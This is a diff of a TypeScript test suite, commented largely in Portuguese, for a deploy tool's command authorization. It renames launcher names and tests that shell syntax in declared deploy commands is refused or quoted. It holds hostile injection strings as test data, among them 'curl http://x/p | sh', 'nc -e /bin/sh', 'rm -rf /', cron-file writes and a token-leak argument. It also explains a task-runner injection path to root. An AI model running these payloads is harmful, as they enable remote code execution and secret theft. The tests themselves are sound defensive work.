@@ -37,14 +37,14 @@ const liberado: DeployFreshnessGate = (req) =>
  * cada `buildSelfDeployScript`: ler a declaração REAL amarraria a suíte ao settings.yaml da máquina — verde onde há declaração,
  * vermelho num checkout que não declara nada, e nenhum dos dois medindo o roteamento. Nomes INVENTADOS (uma oficina de
  * bicicletas): a ferramenta não conhece executor nem receita de ninguém.
- *   launchers/recipeRunners/recipes — o task runner `just` com a única receita `publish-static`, e dois CLIs de publicação
+ *   launchers/recipeRunners/recipes — o task runner `taskrun` com a única receita `publish-static`, e dois CLIs de publicação
  *   legacy.command — o comando diff-aware do alvo (`ship-cli publish <alvo>`); packageRoot — a pasta dos pacotes
  */
 const POLITICA_TESTE = deployPolicyOf({
   deploy: {
     targets: ["armazemweb", "balcao", "galpao"],
-    launchers: ["just", "vercel", "flyctl"],
-    recipeRunners: ["just"],
+    launchers: ["taskrun", "skyhost", "boatctl"],
+    recipeRunners: ["taskrun"],
     recipes: ["publish-static"],
     legacy: { packageRoot: "packages/", command: ["ship-cli", "publish", "{target}"], plan: ["ship-cli", "plan", "{target}"] },
   },
@@ -141,7 +141,7 @@ describe("deployBoard — Fase 4c board-aware deploy", () => {
       webhookBase: "http://x",
       tokenEnvName: "T",
       logPath: "/l",
-      postBuildCommands: ["just publish-static"],
+      postBuildCommands: ["taskrun publish-static"],
     });
     expect(s.startsWith('cd "/ferramenta/packages/storymap-ui" && ')).toBe(true);
     expect(s).not.toContain('cd "/alvo/packages/storymap-ui"'); // a concatenação antiga
@@ -157,10 +157,10 @@ describe("deployBoard — Fase 4c board-aware deploy", () => {
       webhookBase: "http://x",
       tokenEnvName: "T",
       logPath: "/l",
-      postBuildCommands: ["just publish-static"],
+      postBuildCommands: ["taskrun publish-static"],
     };
     const declarado = buildSelfDeployScript(base);
-    expect(declarado).toContain("[postBuild] argv: just publish-static");
+    expect(declarado).toContain("[postBuild] argv: taskrun publish-static");
     expect(declarado).not.toContain("RECUSADO");
     const semPolitica = buildSelfDeployScript({ ...base, commandPolicy: deployPolicyFromSettings(undefined, {}) });
     expect(semPolitica).toContain("[postBuild] RECUSADO");
@@ -241,7 +241,7 @@ describe("deployBoard — Fase 4c board-aware deploy", () => {
     expect(res.reason).toMatch(/em curso|já|already/i);
   });
 
-  it("a PRODUCT board fires `just orch-deploy <pkg>` via the shared registry (agnostic, derived from package)", async () => {
+  it("a PRODUCT board fires the declared deploy command for <pkg> via the shared registry (agnostic, derived from package)", async () => {
     const { exec, calls } = recordingExec();
     const started: string[] = [];
     const fakeLauncher: DeployLauncher = (pkg) => {
@@ -252,7 +252,7 @@ describe("deployBoard — Fase 4c board-aware deploy", () => {
     const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: "packages/armazemweb", deployTargets: ALVOS_TESTE, productDeploy });
 
     expect(res.fired).toBe(true);
-    expect(res.tool).toBe("orch-deploy");
+    expect(res.tool).toBe("legacy-command");
     expect(res.pkg).toBe("armazemweb"); // derived from the package basename — no hardcoded app name
     expect(started).toEqual(["armazemweb"]); // the declared legacy command fired for the right package
     expect(calls).toEqual([]); // NO systemd-run — a product deploy is a tracked child, not a self-restart
@@ -270,7 +270,7 @@ describe("deployBoard — Fase 4c board-aware deploy", () => {
     // o alvo declara QUAIS apps publica (`targets`), mas não COMO — a ferramenta não supõe o executor
     const semComando = deployPolicyOf({ deploy: { targets: ["armazemweb"], legacy: { packageRoot: "packages/" } } });
     const res = await deployBoard({ exec: recordingExec().exec, repoRoot: "/repo", boardPackage: "packages/armazemweb", deployPolicy: semComando, productDeploy, freshness });
-    expect(res).toMatchObject({ fired: false, tool: "orch-deploy", pkg: "armazemweb" });
+    expect(res).toMatchObject({ fired: false, tool: "legacy-command", pkg: "armazemweb" });
     expect(res.refused).toMatch(/settings\.yaml → deploy\.legacy\.command/);
     expect(started).toEqual([]);
     expect(freshness, "a recusa vem ANTES do preflight (que custa um fetch)").not.toHaveBeenCalled();
@@ -303,7 +303,7 @@ describe("deployBoard — Fase 4c board-aware deploy", () => {
         started.push({ target, spec });
         return { pid: 1, whenDone: () => {} };
       });
-    const boardDeploy = { kind: "command" as const, command: "vercel deploy --prod" };
+    const boardDeploy = { kind: "command" as const, command: "skyhost deploy --prod" };
     const base = { exec: recordingExec().exec, repoRoot: "/repo", boardPackage: undefined, board: "armazem", cardId: "s1", boardDeploy };
     const recusado = await deployBoard({ ...base, deployPolicy: deployPolicyOf(undefined), productDeploy: registry() });
     expect(recusado).toMatchObject({ fired: false, tool: "board-command" });
@@ -311,7 +311,7 @@ describe("deployBoard — Fase 4c board-aware deploy", () => {
     expect(started).toEqual([]);
     const ok = await deployBoard({ ...base, deployPolicy: POLITICA_TESTE, productDeploy: registry() });
     expect(ok.fired).toBe(true);
-    expect((started[0]?.spec as { command: string }).command).toBe(`'vercel' 'deploy' '--prod'`);
+    expect((started[0]?.spec as { command: string }).command).toBe(`'skyhost' 'deploy' '--prod'`);
   });
 
   it("a PRODUCT board already deploying is an idempotent no-op (registry isRunning)", async () => {
@@ -320,7 +320,7 @@ describe("deployBoard — Fase 4c board-aware deploy", () => {
     productDeploy.start("armazemweb", await ok("armazemweb")); // a deploy is already in flight
     const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: "packages/armazemweb", deployTargets: ALVOS_TESTE, productDeploy });
     expect(res.fired).toBe(false);
-    expect(res.tool).toBe("orch-deploy");
+    expect(res.tool).toBe("legacy-command");
     expect(res.reason).toMatch(/já em andamento/);
   });
 
@@ -337,7 +337,7 @@ describe("deployBoard — Fase 4c board-aware deploy", () => {
       board: "armazem",
       cardId: "s2",
     });
-    expect(res).toMatchObject({ fired: false, tool: "orch-deploy", inFlight: true, attached: true, targets: ["armazemweb"] });
+    expect(res).toMatchObject({ fired: false, tool: "legacy-command", inFlight: true, attached: true, targets: ["armazemweb"] });
     expect(productDeploy.get("armazemweb")?.attached).toEqual([{ board: "armazem", cardId: "s2" }]);
   });
 
@@ -468,7 +468,7 @@ describe("buildSelfDeployScript — self-deploy settle loop (WS1.1)", () => {
 // detached self-deploy script. Assert the load-bearing SEMANTICS: STATUS-gated, non-fatal, time-boxed, from
 // repoRoot via a login shell, on BOTH the card and card-free branches — and byte-identical legacy when absent.
 describe("buildSelfDeployScript — post-build surface publish (story-ex0161)", () => {
-  const CMD = "just publish-static";
+  const CMD = "taskrun publish-static";
   const withCardAndPublish = () =>
     buildSelfDeployScript({
       serviceUnit: "storymap",
@@ -485,7 +485,7 @@ describe("buildSelfDeployScript — post-build surface publish (story-ex0161)", 
   it("runs the declared command AFTER restart, GATED on STATUS=ok, time-boxed, via a login shell, from repoRoot", () => {
     const s = withCardAndPublish();
     expect(s).toContain(CMD);
-    expect(s).toContain("bash -lc"); // login shell → operator PATH (just/bun resolve like the operator shell)
+    expect(s).toContain("bash -lc"); // login shell → operator PATH (the declared launcher/bun resolve like the operator shell)
     expect(s).toContain("timeout "); // bounded so a hung sync can't starve the settle
     expect(s).toContain('if [ "$STATUS" = ok ]; then'); // never publishes onto a broken build/restart
     expect(s).toContain('cd "/repo"'); // from the repo root, not the storymap-ui package dir
@@ -561,10 +561,10 @@ function keyedLauncher() {
   return { launcher, started, finish: (target: string, code: number | null) => dones.get(target)?.(code) };
 }
 
-// story-ex0071 — a product board's `orch-deploy` ships its backend but NOT the example.com merged face (no
+// story-ex0071 — a product board's declared deploy command ships its backend but NOT the example.com merged face (no
 // hosting unit in any manifest). When the RELEASE promoted a diff that touched the face, deployBoard must
 // ALSO fire the DECLARED face recipe — but only AFTER the backend deploy SETTLES OK (backend-before-face,
-// like `just deploy-site`), and NEVER if the backend failed. It rides the SAME registry (tracked/idempotent).
+// like `taskrun deploy-site`), and NEVER if the backend failed. It rides the SAME registry (tracked/idempotent).
 describe("deployBoard — example.com face chaining (story-ex0071)", () => {
   // O encadeamento da face depende de um manifesto (`scripts/deploy/site-face.json`), que é config do
   // repositório do DONO e não viaja com o artefato. `loadComposedFaceManifest()` resolve por
@@ -756,8 +756,8 @@ describe("resolveDeployKind — descritor ausente/auto = roteamento legado (D-AG
     expect(resolveDeployKind({ kind: "auto", command: "x" })).toBe("auto");
   });
   it("sem kind: command presente ⇒ command; só description ⇒ agent; nenhum ⇒ auto", () => {
-    expect(resolveDeployKind({ command: "vercel deploy --prod" })).toBe("command");
-    expect(resolveDeployKind({ description: "publique via flyctl" })).toBe("agent");
+    expect(resolveDeployKind({ command: "skyhost deploy --prod" })).toBe("command");
+    expect(resolveDeployKind({ description: "publique via boatctl" })).toBe("agent");
     expect(resolveDeployKind({ healthUrl: "https://x/api/health" })).toBe("auto");
     expect(resolveDeployKind({ command: "   " })).toBe("auto"); // whitespace não é um comando
   });
@@ -784,7 +784,7 @@ function specLauncher() {
 // D-AG2 — kind:command: the board's DECLARED shell rides the SAME registry (job key = the BOARD id), so
 // tracking/onDone/revert/settle are all the existing cycle — no parallel mechanism.
 describe("deployBoard — descritor kind:command (D-AG2)", () => {
-  const boardDeploy = { kind: "command" as const, command: "vercel deploy --prod" };
+  const boardDeploy = { kind: "command" as const, command: "skyhost deploy --prod" };
 
   it("dispara o comando declarado pelo registry com a chave do job = id do board (e NUNCA o roteamento por package)", async () => {
     const { exec, calls } = recordingExec();
@@ -805,12 +805,12 @@ describe("deployBoard — descritor kind:command (D-AG2)", () => {
     expect(res).toMatchObject({ fired: true, tool: "board-command", targets: ["armazem"] });
     // story-ex0067: o que segue é a argv AUTORIZADA citada palavra por palavra (mesma execução, sem deixar
     // o `bash -lc` do outro lado expandir `$VAR`/`$(…)` de dentro das aspas do dado declarado).
-    expect(f.started).toEqual([{ target: "armazem", spec: { kind: "shell", command: `'vercel' 'deploy' '--prod'` } }]);
+    expect(f.started).toEqual([{ target: "armazem", spec: { kind: "shell", command: `'skyhost' 'deploy' '--prod'` } }]);
     expect(reg.get("armazem")).toMatchObject({ board: "armazem", cardId: "s1", expectWork: true }); // ctx threaded → onDone age no card
     expect(calls).toEqual([]); // nem systemd-run nem nada por exec — o launcher é o único efeito
   });
 
-  it("já em andamento ⇒ no-op idempotente (mesma régua isRunning do orch-deploy)", async () => {
+  it("já em andamento ⇒ no-op idempotente (mesma régua isRunning do comando declarado)", async () => {
     const { exec } = recordingExec();
     const f = specLauncher();
     const reg = new ProductDeployRegistry(f.launcher);
@@ -853,7 +853,7 @@ describe("deployBoard — descritor kind:command (D-AG2)", () => {
     expect(f.started).toEqual([]);
   });
 
-  it("kind:auto declarado ⇒ roteamento legado (orch-deploy por package), byte-a-byte", async () => {
+  it("kind:auto declarado ⇒ roteamento legado (comando declarado por package), byte-a-byte", async () => {
     const { exec } = recordingExec();
     const f = specLauncher();
     const reg = new ProductDeployRegistry(f.launcher);
@@ -865,7 +865,7 @@ describe("deployBoard — descritor kind:command (D-AG2)", () => {
       deployTargets: ALVOS_TESTE,      boardDeploy: { kind: "auto", command: "nunca-rodar" },
       productDeploy: reg,
     });
-    expect(res.tool).toBe("orch-deploy");
+    expect(res.tool).toBe("legacy-command");
     expect(res.pkg).toBe("armazemweb");
     expect(f.started).toEqual([{ target: "armazemweb", spec: undefined }]); // spec AUSENTE — o launcher legado
   });
@@ -875,7 +875,7 @@ describe("deployBoard — descritor kind:command (D-AG2)", () => {
 // feeds the SAME registry cycle, and its liveSha CLAIM is re-measured by the settle's single ancestry
 // ruler before any deployProof exists. Asymmetry: ok WITHOUT liveSha advances NOTHING (fail-closed).
 describe("deployBoard — descritor kind:agent (D-AG3/D-AG4)", () => {
-  const boardDeploy = { kind: "agent" as const, description: "rode `flyctl deploy` e confirme /api/health", healthUrl: "https://x/api/health", timeoutMinutes: 5 };
+  const boardDeploy = { kind: "agent" as const, description: "rode `boatctl deploy` e confirme /api/health", healthUrl: "https://x/api/health", timeoutMinutes: 5 };
 
   it("monta o spec do agente a partir do BOARD CONFIG + contexto do card (nunca texto livre de chamador)", async () => {
     const { exec } = recordingExec();
@@ -943,7 +943,7 @@ describe("deployBoard — descritor kind:agent (D-AG3/D-AG4)", () => {
     const reg = new ProductDeployRegistry(f.launcher);
     const settle = vi.fn(async () => null);
     await deployBoard({ exec, repoRoot: "/repo", boardPackage: undefined, board: "armazem", cardId: "s1", boardDeploy, productDeploy: reg, settle });
-    f.setVerdict({ ok: false, reason: "flyctl quebrou" });
+    f.setVerdict({ ok: false, reason: "boatctl quebrou" });
     f.finish("armazem", 1);
     await Promise.resolve();
     expect(settle).not.toHaveBeenCalled();
@@ -1025,7 +1025,7 @@ describe("deployBoard agent → ciclo settle→prova→avanço REAL (D-AG4)", ()
       board: "armazem",
       cardId: "s1",
       releasedSha: "aabbccdd",
-      boardDeploy: { kind: "agent", description: "deploy via flyctl" },
+      boardDeploy: { kind: "agent", description: "deploy via boatctl" },
       productDeploy: reg,
       settle,
     });
@@ -1052,7 +1052,7 @@ describe("deployBoard agent → ciclo settle→prova→avanço REAL (D-AG4)", ()
       board: "armazem",
       cardId: "s1",
       releasedSha: "aabbccdd",
-      boardDeploy: { kind: "agent", description: "deploy via flyctl" },
+      boardDeploy: { kind: "agent", description: "deploy via boatctl" },
       productDeploy: reg,
       settle,
     });
@@ -1099,8 +1099,8 @@ describe("BoardConfigSchema — bloco deploy do board.yaml (D-AG1)", () => {
   const baseCfg = { id: "b", name: "B", statuses: [], releases: [], personas: [], systems: [], linkTypes: [] };
 
   it("bloco válido (command) e bloco válido (agent) conformam", () => {
-    expect(parseBoardConfig({ ...baseCfg, deploy: { kind: "command", command: "vercel deploy --prod" } }).ok).toBe(true);
-    expect(parseBoardConfig({ ...baseCfg, deploy: { description: "rode flyctl deploy", healthUrl: "https://x/h", timeoutMinutes: 10 } }).ok).toBe(true);
+    expect(parseBoardConfig({ ...baseCfg, deploy: { kind: "command", command: "skyhost deploy --prod" } }).ok).toBe(true);
+    expect(parseBoardConfig({ ...baseCfg, deploy: { description: "rode boatctl deploy", healthUrl: "https://x/h", timeoutMinutes: 10 } }).ok).toBe(true);
     expect(parseBoardConfig(baseCfg).ok).toBe(true); // ausente segue válido (legado)
   });
 
@@ -1123,7 +1123,7 @@ describe("BoardConfigSchema — bloco deploy do board.yaml (D-AG1)", () => {
   });
 
   it("kind desconhecido e timeout não-positivo ⇒ erros de schema (nunca crash)", () => {
-    expect(parseBoardConfig({ ...baseCfg, deploy: { kind: "vercel" } }).ok).toBe(false);
+    expect(parseBoardConfig({ ...baseCfg, deploy: { kind: "skyhost" } }).ok).toBe(false);
     expect(parseBoardConfig({ ...baseCfg, deploy: { command: "x", timeoutMinutes: -5 } }).ok).toBe(false);
   });
 });
@@ -1135,7 +1135,7 @@ describe("BoardConfigSchema — bloco deploy do board.yaml (D-AG1)", () => {
 // E por agentes, é path-disjunto do código e portanto não passa pelo gate de código — e essa string era
 // entregue a `bash -lc` como SCRIPT, dentro de um unit transitório do systemd, como ROOT. Logo, quem
 // conseguisse escrever uma linha de CONFIGURAÇÃO conseguia execução arbitrária como root:
-//   deployCmd: "just <receita-declarada>; curl http://x/p | sh"
+//   deployCmd: "taskrun <receita-declarada>; curl http://x/p | sh"
 // Para o mecanismo, isso era indistinguível de "o comando que o dono declarou". Este repositório já
 // pagou por essa classe uma vez (a injeção de shell no sweep-commit); é a mesma.
 //
@@ -1158,7 +1158,7 @@ describe("self-deploy — o passo privilegiado não interpreta dado declarado (s
     });
 
   it("um deployCmd com `;` NÃO vira dois comandos como root — nada é executado, a recusa é registrada", () => {
-    const s = script(["just publish-static; curl http://x/p | sh"]);
+    const s = script(["taskrun publish-static; curl http://x/p | sh"]);
     // O carregamento do payload: em NENHUM lugar o `curl` está posicionado para ser executado. A string
     // aparece SÓ dentro do `echo` da recusa (é o rastro), nunca como comando.
     const executable = s.replace(/echo '[^']*'/g, "");
@@ -1170,7 +1170,7 @@ describe("self-deploy — o passo privilegiado não interpreta dado declarado (s
   });
 
   it("`$(...)` e backtick declarados também são recusados — substituição de comando é sintaxe de shell", () => {
-    for (const evil of ["just x $(id > /tmp/pwn)", "just x `id`", "just x && rm -rf /", "just x || nc -e /bin/sh h 1", "just x > /etc/cron.d/pwn"]) {
+    for (const evil of ["taskrun x $(id > /tmp/pwn)", "taskrun x `id`", "taskrun x && rm -rf /", "taskrun x || nc -e /bin/sh h 1", "taskrun x > /etc/cron.d/pwn"]) {
       const s = script([evil]);
       expect(s).toContain("[postBuild] RECUSADO");
       const executable = s.replace(/echo '[^']*'/g, "");
@@ -1181,11 +1181,11 @@ describe("self-deploy — o passo privilegiado não interpreta dado declarado (s
   });
 
   it("o comando REAL declarado hoje continua rodando, e a argv exata vai para o log (auditável)", () => {
-    const s = script(["just publish-static"]);
+    const s = script(["taskrun publish-static"]);
     // Argv: o script do shell é a constante `exec "$@"`; as palavras são argumentos, não script.
-    expect(s).toContain(`bash -lc 'exec "$@"' postBuild 'just' 'publish-static'`);
+    expect(s).toContain(`bash -lc 'exec "$@"' postBuild 'taskrun' 'publish-static'`);
     // O que rodou como root fica ESCRITO, não deduzido.
-    expect(s).toContain("[postBuild] argv: just publish-static");
+    expect(s).toContain("[postBuild] argv: taskrun publish-static");
     // E as garantias do ex0161 seguem: gated no STATUS, time-boxed, não-fatal, a partir da raiz do repo.
     expect(s).toContain('if [ "$STATUS" = ok ]; then');
     expect(s).toContain("timeout ");
@@ -1195,16 +1195,16 @@ describe("self-deploy — o passo privilegiado não interpreta dado declarado (s
 
   it("uma palavra com espaço declarada entre aspas chega como UM argumento (a capacidade não foi tirada)", () => {
     // O veículo desta garantia é um lançador que recebe argv DE VERDADE. Ela era demonstrada com
-    // `just deploy "duas palavras"`, e a 3ª passada (story-ex0067) mediu que ali a garantia era FALSA: um
-    // task runner interpola o parâmetro SEM citar na linha da receita, então `just <r> 'duas palavras'` vira
-    // `… duas palavras` — DOIS argumentos do outro lado, não um (medido com `just --dry-run`).
+    // `taskrun deploy "duas palavras"`, e a 3ª passada (story-ex0067) mediu que ali a garantia era FALSA: um
+    // task runner interpola o parâmetro SEM citar na linha da receita, então `taskrun <r> 'duas palavras'` vira
+    // `… duas palavras` — DOIS argumentos do outro lado, não um (medido com `taskrun --dry-run`).
     // A garantia real é a da fronteira (re-citação palavra-por-palavra), e ela se verifica onde não há um
     // segundo shell relendo o argumento.
-    const s = script([`vercel deploy --msg "duas palavras"`]);
-    expect(s).toContain(`postBuild 'vercel' 'deploy' '--msg' 'duas palavras'`);
+    const s = script([`skyhost deploy --msg "duas palavras"`]);
+    expect(s).toContain(`postBuild 'skyhost' 'deploy' '--msg' 'duas palavras'`);
     expect(s).not.toContain("[postBuild] RECUSADO");
     // E no task runner o mesmo argumento é RECUSADO por forma — porque lá ele não sobreviveria como um só.
-    expect(script([`just publish-static "duas palavras"`])).toMatch(/não é uma palavra literal/);
+    expect(script([`taskrun publish-static "duas palavras"`])).toMatch(/não é uma palavra literal/);
   });
 
   it("o OUTRO caminho privilegiado (`deploy.kind=command`) recusa sintaxe de shell — e não dispara nada", async () => {
@@ -1219,7 +1219,7 @@ describe("self-deploy — o passo privilegiado não interpreta dado declarado (s
       boardPackage: undefined,
       board: "armazem",
       cardId: "s1",
-      boardDeploy: { kind: "command", command: "vercel deploy --prod; curl http://x/p | sh" },
+      boardDeploy: { kind: "command", command: "skyhost deploy --prod; curl http://x/p | sh" },
       productDeploy: reg,
     });
     expect(res.fired).toBe(false);
@@ -1233,27 +1233,27 @@ describe("self-deploy — o passo privilegiado não interpreta dado declarado (s
       boardPackage: undefined,
       board: "armazem",
       cardId: "s2",
-      boardDeploy: { kind: "command", command: "vercel deploy --prod" },
+      boardDeploy: { kind: "command", command: "skyhost deploy --prod" },
       productDeploy: new ProductDeployRegistry(f.launcher),
     });
     expect(ok.fired).toBe(true);
   });
 
   it("a régua do argv: palavras sim, sintaxe de shell não", () => {
-    expect(parseDeclaredArgv("just publish-static")).toEqual(["just", "publish-static"]);
+    expect(parseDeclaredArgv("taskrun publish-static")).toEqual(["taskrun", "publish-static"]);
     // parseDeclaredArgv é SÓ o parser: ele diz se a string é uma lista de palavras, NÃO se essas palavras
     // podem ser executadas como root. Um interpretador é uma lista de palavras perfeitamente válida —
     // quem recusa isso é authorizeDeployCommand (ver o describe da allow-list logo abaixo).
     expect(parseDeclaredArgv(`bash -c 'curl http://x/p | sh'`)).toEqual(["bash", "-c", "curl http://x/p | sh"]);
-    expect(parseDeclaredArgv("  just   a  b ")).toEqual(["just", "a", "b"]);
-    expect(parseDeclaredArgv(`just --m "a b" 'c d'`)).toEqual(["just", "--m", "a b", "c d"]);
+    expect(parseDeclaredArgv("  taskrun   a  b ")).toEqual(["taskrun", "a", "b"]);
+    expect(parseDeclaredArgv(`taskrun --m "a b" 'c d'`)).toEqual(["taskrun", "--m", "a b", "c d"]);
     // Metacaractere DENTRO de aspas é literal nos dois mundos → seguro, e preservado.
     expect(parseDeclaredArgv(`echo "a;b"`)).toEqual(["echo", "a;b"]);
     // Fora de aspas, cada um destes só significa algo para um shell → fail-closed.
     for (const bad of ["a; b", "a && b", "a | b", "a $X", "a $(b)", "a `b`", "a > f", "a < f", "a & ", "a {b}", "a (b)", "a *", "a ?", "a \\ b", "a\nb", "a #c", "a ~b", "a !b"]) {
       expect(parseDeclaredArgv(bad)).toBeNull();
     }
-    expect(parseDeclaredArgv(`just "aberta`)).toBeNull(); // aspas não fechadas
+    expect(parseDeclaredArgv(`taskrun "aberta`)).toBeNull(); // aspas não fechadas
     expect(parseDeclaredArgv("   ")).toBeNull();
     expect(parseDeclaredArgv("")).toBeNull();
   });
@@ -1334,19 +1334,19 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
   });
 
   it("uma OPÇÃO no task runner é recusada — `--justfile`/`-f` apontariam a receita para fora do repo", () => {
-    const s = script(["just --justfile /tmp/evil.just pwn"]);
+    const s = script(["taskrun --justfile /tmp/evil.just pwn"]);
     expect(s).toContain("[postBuild] RECUSADO");
     expect(s).toMatch(/receita/);
     expect(executablePart(s)).not.toContain("/tmp/evil.just");
     // -f é o mesmo vetor com o nome curto: a régua é de FORMA (nada que comece com `-`), não uma lista de flags.
-    expect(script(["just -f /tmp/evil.just pwn"])).toContain("[postBuild] RECUSADO");
+    expect(script(["taskrun -f /tmp/evil.just pwn"])).toContain("[postBuild] RECUSADO");
   });
 
   it("NÃO-REGRESSÃO: o deployCmd REAL de hoje continua sendo executado, com a argv exata no log", () => {
-    const s = script(["just publish-static"]);
+    const s = script(["taskrun publish-static"]);
     expect(s).not.toContain("[postBuild] RECUSADO");
-    expect(s).toContain(`bash -lc 'exec "$@"' postBuild 'just' 'publish-static'`);
-    expect(s).toContain("[postBuild] argv: just publish-static");
+    expect(s).toContain(`bash -lc 'exec "$@"' postBuild 'taskrun' 'publish-static'`);
+    expect(s).toContain("[postBuild] argv: taskrun publish-static");
     // as garantias do ex0161 seguem: gated no STATUS, time-boxed, não-fatal, da raiz do repo
     expect(s).toContain('if [ "$STATUS" = ok ]; then');
     expect(s).toContain("timeout ");
@@ -1376,7 +1376,7 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
       boardPackage: undefined,
       board: "armazem",
       cardId: "s2",
-      boardDeploy: { kind: "command", command: "vercel deploy --prod" },
+      boardDeploy: { kind: "command", command: "skyhost deploy --prod" },
       productDeploy: new ProductDeployRegistry(f.launcher),
     });
     expect(ok.fired).toBe(true);
@@ -1385,7 +1385,7 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
   it("kind=command: o que segue ao registry é a argv AUTORIZADA re-citada — o login shell não expande `$(…)` nem `$VAR`", async () => {
     // A DIVERGÊNCIA entre os dois lados da fronteira. O parser trata `"…"` como agrupamento LITERAL; o
     // `bash -lc` do outro lado do registry NÃO: dentro de aspas duplas ele EXPANDE `$VAR` e EXECUTA
-    // `$(…)`. Enquanto a string crua seguia adiante, um alvo autorizado bastava — `vercel deploy --msg
+    // `$(…)`. Enquanto a string crua seguia adiante, um alvo autorizado bastava — `skyhost deploy --msg
     // "$(curl http://x/p | sh)"` roda o payload como root, e `"$AGILEHARNESS_MCP_TOKEN"` vaza o segredo do
     // serviço para dentro dos argumentos. A fronteira normaliza: cada palavra autorizada vai citada.
     const { exec } = recordingExec();
@@ -1396,12 +1396,12 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
       boardPackage: undefined,
       board: "armazem",
       cardId: "s1",
-      boardDeploy: { kind: "command", command: `vercel deploy --msg "$(id > /tmp/pwn)"` },
+      boardDeploy: { kind: "command", command: `skyhost deploy --msg "$(id > /tmp/pwn)"` },
       productDeploy: new ProductDeployRegistry(f.launcher),
     });
     expect(res.fired).toBe(true); // a capacidade do dono continua: o comando declarado roda
     const spec = f.started[0]?.spec as { kind: string; command: string };
-    expect(spec.command).toBe(`'vercel' 'deploy' '--msg' '$(id > /tmp/pwn)'`);
+    expect(spec.command).toBe(`'skyhost' 'deploy' '--msg' '$(id > /tmp/pwn)'`);
     // nada de `$(` desprotegido chega ao shell — a substituição de comando morre como texto literal
     expect(spec.command).not.toContain(`"$(`);
 
@@ -1411,11 +1411,11 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
       boardPackage: undefined,
       board: "armazem",
       cardId: "s2",
-      boardDeploy: { kind: "command", command: `vercel deploy --msg "$AGILEHARNESS_MCP_TOKEN"` },
+      boardDeploy: { kind: "command", command: `skyhost deploy --msg "$AGILEHARNESS_MCP_TOKEN"` },
       productDeploy: new ProductDeployRegistry(f.launcher),
     });
     expect(leak.fired).toBe(true);
-    expect((f.started[1]?.spec as { command: string }).command).toBe(`'vercel' 'deploy' '--msg' '$AGILEHARNESS_MCP_TOKEN'`);
+    expect((f.started[1]?.spec as { command: string }).command).toBe(`'skyhost' 'deploy' '--msg' '$AGILEHARNESS_MCP_TOKEN'`);
   });
 
   it("a allow-list é do OPERADOR (settings.yaml e env), nunca do board — e nem por env um interpretador entra", () => {
@@ -1423,7 +1423,7 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
     // serviço (systemd) — canais que board-data não alcança. A capacidade do dono continua inteira.
     const extended = resolveDeployLaunchers({ AGILEHARNESS_DEPLOY_LAUNCHERS: "pulumi, wrangler" }, POLITICA_TESTE.launchers);
     expect(extended).toContain("pulumi");
-    expect(extended).toContain("just"); // o declarado no settings nunca é substituído, só estendido
+    expect(extended).toContain("taskrun"); // o declarado no settings nunca é substituído, só estendido
     expect(authorizeDeployCommand("pulumi up --yes", { ...CMD_POLICY, launchers: extended }).refusal).toBeNull();
     // e sem a declaração de `pulumi` (nem no settings nem no env) o MESMO comando é recusado
     expect(authorizeDeployCommand("pulumi up --yes").refusal).toMatch(/settings\.yaml → deploy\.launchers/);
@@ -1436,13 +1436,13 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
   });
 
   it("authorizeDeployCommand: a argv autorizada sai pronta; a recusa sai com motivo nomeado", () => {
-    expect(authorizeDeployCommand("just publish-static").argv).toEqual(["just", "publish-static"]);
-    expect(authorizeDeployCommand("vercel deploy --prod").argv).toEqual(["vercel", "deploy", "--prod"]);
+    expect(authorizeDeployCommand("taskrun publish-static").argv).toEqual(["taskrun", "publish-static"]);
+    expect(authorizeDeployCommand("skyhost deploy --prod").argv).toEqual(["skyhost", "deploy", "--prod"]);
     for (const [cmd, motivo] of [
       [`bash -c 'id'`, /fora da allow-list/],
       [`/bin/sh -c id`, /caminho/],
-      ["just --justfile /tmp/x pwn", /receita/],
-      ["just x; id", /sintaxe de SHELL/],
+      ["taskrun --justfile /tmp/x pwn", /receita/],
+      ["taskrun x; id", /sintaxe de SHELL/],
       ["", /sintaxe de SHELL|vazia/],
     ] as [string, RegExp][]) {
       const v = authorizeDeployCommand(cmd);
@@ -1451,7 +1451,7 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
     }
     // Caractere de CONTROLE num argumento quebraria a linha de auditoria (o rastro do que rodou como
     // root) — e nenhum argumento de deploy real tem um. Recusado por FORMA.
-    expect(authorizeDeployCommand(`just deploy "a\nb"`).refusal).toMatch(/controle/);
+    expect(authorizeDeployCommand(`taskrun deploy "a\nb"`).refusal).toMatch(/controle/);
   });
 });
 
@@ -1461,23 +1461,23 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
 // O ATAQUE que a allow-list de LANÇADORES não impedia, porque ela olha só `argv[0]`. O atacante usa um
 // lançador AUTORIZADO e põe o payload no ARGUMENTO — e a cadeia fecha porque um task runner NÃO passa
 // parâmetro como argv: ele o cola COMO TEXTO na linha da receita, que então vai para um shell. Qualquer receita
-// parametrizada serve de exemplo; a mecânica se reproduz com `just --dry-run`:
+// parametrizada serve de exemplo; a mecânica se reproduz com `taskrun --dry-run`:
 //
 //   receita:   greet name:
 //                  echo hello {{name}}
-//   chamada:   just greet '$(id)'
+//   chamada:   taskrun greet '$(id)'
 //   linha que o shell receberia:   echo hello $(id)
 //
 // O payload virou SINTAXE de shell, executada como ROOT, a partir de uma linha de board-data
 // (`deploy.surfaces[].deployCmd` / `deploy.command`) que é path-disjunta do código e não passa pelo gate.
 // Aspas na declaração não protegem nada: para o parser elas são agrupamento LITERAL e morrem ali; o que
-// segue é a palavra crua, e é o `just` que a re-expõe a um shell. Nenhuma receita comum foi escrita
+// segue é a palavra crua, e é o `taskrun` que a re-expõe a um shell. Nenhuma receita comum foi escrita
 // para receber dado hostil.
 //
 // A CORREÇÃO, por DESENHO e sem tirar capacidade: a régua passa a valer para a CADEIA — allow-list da
 // RECEITA (o alvo secundário) e FORMA de PALAVRA para os argumentos dela. Extensível só pelo env do
-// SERVIÇO. O `deployCmd` real de hoje (`just <receita-declarada>`) segue rodando, automático e sem aprovação
-// humana; um lançador que NÃO é task runner (`vercel`) não perde nada, porque ali não existe segundo shell.
